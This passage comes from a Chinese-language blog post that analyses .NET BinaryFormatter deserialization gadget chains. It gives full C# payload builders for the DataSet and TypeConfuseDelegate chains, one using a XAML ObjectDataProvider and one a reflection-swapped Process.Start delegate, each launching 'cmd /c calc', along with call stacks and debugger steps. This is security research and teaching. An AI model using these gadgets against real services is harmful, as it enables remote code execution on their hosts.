class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> xaml</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = xaml;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingPropersGadgets</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingPropersGadgets</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">GetTextFormattingPropersBytes</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> xaml_payload =</span><br><span class="line">                <span class="string">&quot;&lt;ResourceDictionary \n                    xmlns=\&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation\&quot; \n                    xmlns:d=\&quot;http://schemas.microsoft.com/winfx/2006/xaml\&quot; \n                    xmlns:b=\&quot;clr-namespace:System;assembly=mscorlib\&quot; \n                    xmlns:c=\&quot;clr-namespace:System.Diagnostics;assembly=system\&quot;&gt;\n    &lt;ObjectDataProvider d:Key=\&quot;\&quot; ObjectType=\&quot;&#123;d:Type c:Process&#125;\&quot; MethodName=\&quot;Start\&quot;&gt;\n        &lt;ObjectDataProvider.MethodParameters&gt;\n            &lt;b:String&gt;cmd&lt;/b:String&gt;\n            &lt;b:String&gt;/c calc&lt;/b:String&gt;\n        &lt;/ObjectDataProvider.MethodParameters&gt;\n    &lt;/ObjectDataProvider&gt;\n&lt;/ResourceDictionary&gt;&quot;</span>;</span><br><span class="line">            TextFormattingRunPropertiesMarshal payload = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(xaml_payload);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, payload);</span><br><span class="line">                <span class="keyword">return</span> memoryStream.ToArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DataSetMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">byte</span>[] _fakeTable;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(System.Data.DataSet));</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.RemotingFormat&quot;</span>, System.Data.SerializationFormat.Binary);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.DataSetName&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Namespace&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Prefix&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.CaseSensitive&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.LocaleLCID&quot;</span>, <span class="number">0x409</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.EnforceConstraints&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.ExtendedProperties&quot;</span>, (System.Data.PropertyCollection)<span class="literal">null</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Tables.Count&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Tables_0&quot;</span>, _fakeTable);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetFakeTable</span>(<span class="params"><span class="built_in">byte</span>[] bfPayload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _fakeTable = bfPayload;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DatasetGadgets</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> textFormattingPropersBytes = TextFormattingPropersGadgets.GetTextFormattingPropersBytes();</span><br><span class="line">            <span class="keyword">var</span> dataSetMarshal = <span class="keyword">new</span> DataSetMarshal();</span><br><span class="line">            dataSetMarshal.SetFakeTable(textFormattingPropersBytes);</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, dataSetMarshal);</span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用堆栈如下，和我们分析的完全一致。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">new TextFormattingRunProperties() </span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject() [2]</span><br><span class="line">ObjectManager.FixupSpecialObject() [2]</span><br><span class="line">ObjectManager.DoFixups() [2]</span><br><span class="line">ObjectReader.Deserialize() [2]</span><br><span class="line">BinaryFormatter.Deserialize() [2]</span><br><span class="line">DataSet.DeserializeDataSetSchema() </span><br><span class="line">new DataSet()</span><br><span class="line">new DataSet()</span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject() [1]</span><br><span class="line">ObjectManager.FixupSpecialObject() [1]</span><br><span class="line">ObjectManager.DoFixups() [1]</span><br><span class="line">ObjectReader.Deserialize() </span><br><span class="line">BinaryFormatter.Deserialize() </span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">DatasetGadgets.Main()</span><br></pre></td></tr></table></figure>
<p>至此DataSet这个Gadgets就告一段落，也就是一个二次反序列化的工具</p>
<h1 id="03-TypeConfuseDelegate"><a href="#03-TypeConfuseDelegate" class="headerlink" title="03-TypeConfuseDelegate"></a>03-TypeConfuseDelegate</h1><p>TypeConfuseDelegate他不是一个类，是作者给它取的一个名字，类型混淆委托，那么首先就得了解C#中有关委托的概念了。</p>
<h2 id="03-1-委托-amp-amp-多播委托"><a href="#03-1-委托-amp-amp-多播委托" class="headerlink" title="03-1 委托&amp;&amp;多播委托"></a>03-1 委托&amp;&amp;多播委托</h2><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/dotnet/csharp/programming-guide/delegates/how-to-declare-instantiate-and-use-a-delegate">https://learn.microsoft.com/zh-cn/dotnet/csharp/programming-guide/delegates/how-to-declare-instantiate-and-use-a-delegate</a><br>官方文档中委托讲的比较详细，给了个例子</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">CustomCallback</span>(<span class="params"><span class="built_in">string</span> s</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">TestClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Hello</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">$&quot;  Hello, <span class="subst">&#123;s&#125;</span>!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Goodbye</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">$&quot;  Goodbye, <span class="subst">&#123;s&#125;</span>!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        CustomCallback hiDel, byeDel, multiDel, multiMinusHiDel;</span><br><span class="line">        hiDel = Hello;</span><br><span class="line">        byeDel = Goodbye;</span><br><span class="line">        multiDel = hiDel + byeDel;</span><br><span class="line">        multiMinusHiDel = multiDel - hiDel;</span><br><span class="line"></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Invoking delegate hiDel:&quot;</span>);</span><br><span class="line">        hiDel(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Invoking delegate byeDel:&quot;</span>);</span><br><span class="line">        byeDel(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Invoking delegate multiDel:&quot;</span>);</span><br><span class="line">        multiDel(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Invoking delegate multiMinusHiDel:&quot;</span>);</span><br><span class="line">        multiMinusHiDel(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>委托它的类型是<code>delegate</code>，和Java中的动态代理一样，但是比Java的方便很多，他可以代理一个方法，有趣的是它还可以进行加减操作，上述例子输出内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Invoking delegate hiDel:</span><br><span class="line">  Hello, A!                       </span><br><span class="line">Invoking delegate byeDel:         </span><br><span class="line">  Goodbye, B!                     </span><br><span class="line">Invoking delegate multiDel:       </span><br><span class="line">  Hello, C!                       </span><br><span class="line">  Goodbye, C!                     </span><br><span class="line">Invoking delegate multiMinusHiDel:</span><br><span class="line">  Goodbye, D!    </span><br></pre></td></tr></table></figure>
<p>先是输出Hello、GooBye两个方法正常使用，然后我们用<code>多播委托</code>将这两个方法相加，最后<code>multiDel(&quot;C&quot;);</code>就可以调用2个方法，然后减去一个就只代理一个方法，这就是委托的基本用法。<br>需要注意的点是委托的方法和委托的定义类型要一样，也就是签名必须一直，返回值、参数类型、参数个数，都必须对应上才可以使用委托。但是多播委托的情况有点特殊，下面会解释</p>
<h2 id="03-2-Gadgets"><a href="#03-2-Gadgets" class="headerlink" title="03-2 Gadgets"></a>03-2 Gadgets</h2><p>Yso中的构造如下，看起来很简单</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">object</span> <span class="title">GetXamlGadget</span>(<span class="params"><span class="built_in">string</span> xaml_payload</span>)</span></span><br><span class="line">       &#123;</span><br><span class="line">           Delegate da = <span class="keyword">new</span> Comparison&lt;<span class="built_in">string</span>&gt;(String.Compare);</span><br><span class="line">           Comparison&lt;<span class="built_in">string</span>&gt; d = (Comparison&lt;<span class="built_in">string</span>&gt;)MulticastDelegate.Combine(da, da);</span><br><span class="line">           IComparer&lt;<span class="built_in">string</span>&gt; comp = Comparer&lt;<span class="built_in">string</span>&gt;.Create(d);</span><br><span class="line">           SortedSet&lt;<span class="built_in">string</span>&gt; <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(comp);</span><br><span class="line">           <span class="keyword">set</span>.Add(xaml_payload);</span><br><span class="line">           <span class="keyword">set</span>.Add(<span class="string">&quot;&quot;</span>);</span><br><span class="line">           FieldInfo fi = <span class="keyword">typeof</span>(MulticastDelegate).GetField(<span class="string">&quot;_invocationList&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line">           <span class="built_in">object</span>[] invoke_list = d.GetInvocationList();</span><br><span class="line">           <span class="comment">// We use XamlReader.Parse() to trigger the xaml execution</span></span><br><span class="line">           invoke_list[<span class="number">1</span>] = <span class="keyword">new</span> Func&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt;(System.Windows.Markup.XamlReader.Parse);</span><br><span class="line">           fi.SetValue(d, invoke_list);</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">set</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>我们按照上面改一下就行了。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DonNET_Deserialization</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TypeConfuseDelegate</span></span><br><span class="line">&#123;  </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Delegate da = <span class="keyword">new</span> Comparison&lt;<span class="built_in">string</span>&gt;(String.Compare);</span><br><span class="line">        Comparison&lt;<span class="built_in">string</span>&gt; d = (Comparison&lt;<span class="built_in">string</span>&gt;)MulticastDelegate.Combine(da, da);</span><br><span class="line">        IComparer&lt;<span class="built_in">string</span>&gt; comp = Comparer&lt;<span class="built_in">string</span>&gt;.Create(d);</span><br><span class="line">        SortedSet&lt;<span class="built_in">string</span>&gt; <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(comp);</span><br><span class="line">        <span class="keyword">set</span>.Add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">        <span class="keyword">set</span>.Add(<span class="string">&quot;/c calc&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        FieldInfo fi = <span class="keyword">typeof</span>(MulticastDelegate).GetField(<span class="string">&quot;_invocationList&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line">        <span class="built_in">object</span>[] invoke_list = d.GetInvocationList();</span><br><span class="line">        <span class="comment">// Modify the invocation list to add Process::Start(string, string)</span></span><br><span class="line">        invoke_list[<span class="number">1</span>] = <span class="keyword">new</span> Func&lt;<span class="built_in">string</span>, <span class="built_in">string</span>, Process&gt;(Process.Start);</span><br><span class="line">        fi.SetValue(d, invoke_list);</span><br><span class="line">        <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 构建formatter</span></span><br><span class="line">            BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            binaryFormatter.Serialize(memoryStream, <span class="keyword">set</span>);</span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">            binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个payload的流程也很简单<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707312464560-6c74ad6f-bc9a-45c2-b9c2-c36f05f00300.png#averageHue=%23272523&clientId=ua59d6175-9311-4&from=paste&height=569&id=u2c261c53&originHeight=711&originWidth=1345&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=163179&status=done&style=none&taskId=u2ba60496-06c0-4c65-9d0a-626dcfa5289&title=&width=1076" alt="image.png"><br>首先我们对String.Compare创建了一个委托，然后我们合并2个委托为一个多播委托<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707312508272-670342d8-1626-485d-9dc2-5f3467fb23af.png#averageHue=%23272523&clientId=ua59d6175-9311-4&from=paste&height=569&id=u0bcc918b&originHeight=711&originWidth=1345&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=163179&status=done&style=none&taskId=uc70435af-dfcb-401a-ba32-9c4b6b3ee33&title=&width=1076" alt="image.png"><br>然后用这个多播委托去创建一个Comparer比较器，放入Sortset的构造方法内<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707312554745-0fc20302-a770-484f-ba4f-560ec36bf51d.png#averageHue=%23272524&clientId=ua59d6175-9311-4&from=paste&height=638&id=u0609e67e&originHeight=798&originWidth=1609&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=213149&status=done&style=none&taskId=u699f40c9-569a-4837-9890-b573319996b&title=&width=1287.2" alt="image.png"><br>之后往set添加我们命令执行的参数，在后面会用到，随后反射修改委托d中的invocationlist（待触发方法），将Function改为我们需要的Process.Start<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707312630573-03dd36e7-0149-4b81-bdbb-98671aef5d51.png#averageHue=%23272524&clientId=ua59d6175-9311-4&from=paste&height=638&id=ue5e97e20&originHeight=798&originWidth=1609&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=213149&status=done&style=none&taskId=u47d90c37-8459-479a-ad3d-dfaa7d2008f&title=&width=1287.2" alt="image.png"><br>随后进入反序列化方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707312652623-6cf5ddc5-4a00-4e25-a710-402b3d3f171b.png#averageHue=%23272625&clientId=ua59d6175-9311-4&from=paste&height=641&id=uf4e27366&originHeight=801&originWidth=1631&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=236112&status=done&style=none&taskId=uacaaded8-af85-46c3-aa67-6e56deb81b2&title=&width=1304.8" alt="image.png"><br>在反序列化的时候会假如没实现代理器但有Serilizable注解会走<code>RaiseDeserializationEvent</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707312678650-d6d6bd05-5a37-453b-98a5-c96fbd6e8e48.png#averageHue=%2320201f&clientId=ua59d6175-9311-4&from=paste&height=278&id=u9645ab0e&originHeight=347&originWidth=1047&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54121&status=done&style=none&taskId=u51390ed9-aeac-4f82-9866-df279467b0a&title=&width=837.6" alt="image.png"><br>最后到了OnDeserialization#Add方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707312697737-e8fe545a-87ae-4dc8-b255-1aec70eeb54e.png#averageHue=%23282725&clientId=ua59d6175-9311-4&from=paste&height=450&id=u25bcac22&originHeight=562&originWidth=1537&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=179944&status=done&style=none&taskId=uace0335d-b178-4e2e-9e61-7c023107e50&title=&width=1229.6" alt="image.png"><br>这里原本是反序列化将Set的item添加进去，我们跟进Add方法内部<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707312771236-1719f381-0531-4d09-b66a-d2187a91824d.png#averageHue=%23242321&clientId=ua59d6175-9311-4&from=paste&height=522&id=u0ea903f1&originHeight=653&originWidth=1516&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=146164&status=done&style=none&taskId=u997538a4-e5c2-40e0-922b-b4e5594e84b&title=&width=1212.8" alt="image.png"><br>此时由于Compare方法已经被我们修改为了Process.Start方法，因此执行了命令</p>
<h2 id="03-3-签名问题"><a href="#03-3-签名问题" class="headerlink" title="03-3 签名问题"></a>03-3 签名问题</h2><p>其实这里还有个问题，Start方法的签名长这样<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707312915553-0a76b3cf-42b2-4afa-9fad-ac29dca9a900.png#averageHue=%231f1c1c&clientId=ua59d6175-9311-4&from=paste&height=118&id=u6659ef0e&originHeight=148&originWidth=965&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22785&status=done&style=none&taskId=ub7af4ed6-f0d2-416d-91a3-a2e43b5b09a&title=&width=772" alt="image.png"><br>参数虽然都是string，但是返回值是Process，而Compare方法的签名如下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707312935767-3f2aadd5-729e-4d3f-8a66-c0b06f951d67.png#averageHue=%231d1c1c&clientId=ua59d6175-9311-4&from=paste&height=129&id=u0c19031d&originHeight=161&originWidth=1154&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22046&status=done&style=none&taskId=u087b528f-1cb2-492d-b1d2-ab782e44206&title=&width=923.2" alt="image.png"><br>它的返回值是int，为什么多播委托可以解决签名不一样的问题呢?官方给出的解释是这样的</p>
<blockquote>
<p>The only weird thing about this code is TypeConfuseDelegate. It’s a long standing issue that .NET delegates don’t always enforce their type signature, especially the return value. In this case we create a two entry multicast delegate (a delegate which will run multiple single delegates sequentially), setting one delegate to String::Compare which returns an int, and another to Process::Start which returns an instance of the Process class. This works, even when deserialized and invokes the two separate methods. It will then return the created process object as an integer, which just means it will return the pointer to the instance of the process object.</p>
</blockquote>
<blockquote>
<p>这段代码唯一奇怪的地方是 TypeConfuseDelegate。 .NET 委托并不总是强制执行其类型签名，尤其是返回值，这是一个长期存在的问题。在本例中，我们创建一个包含两个条目的多播委托（一个将按顺序运行多个单个委托的委托），将一个委托设置为 String::Compare（返回 int），将另一个委托设置为 Process::Start（返回 Process 类的实例） 。即使反序列化并调用两个单独的方法也是如此。然后它将以整数形式返回创建的进程对象，这意味着它将返回指向进程对象实例的指针。</p>
</blockquote>
<p>这句话的意思是在刚开始反序列化时，我们通过GetInvocationList获取了2个委托<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707313055600-b099c11a-ad4a-4cfb-849f-f12b191c8318.png#averageHue=%23302e2d&clientId=ua59d6175-9311-4&from=paste&height=61&id=u1ef6dad3&originHeight=76&originWidth=492&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17260&status=done&style=none&taskId=u92d7a505-0387-41a1-ad97-0b857c4a48a&title=&width=393.6" alt="image.png"><br>也就是我们创建的2个Compare方法，然后我们将其中一个改为Process.Start方法，这表示这时候传递的是指针。因此可以绕过签名问题。</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/反序列化/" class="tag">#反序列化</a><a href="/tags/NET/" class="tag">#.NET</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/02/10/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B%20Web%20Writeup/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">2023年春秋杯网络安全联赛冬季赛 Web Writeup</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/02/06/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20XmlSerializer%20Deserialization%2002/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">【.NET 安全】ASP.NET XmlSerializer Deserialization 02</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
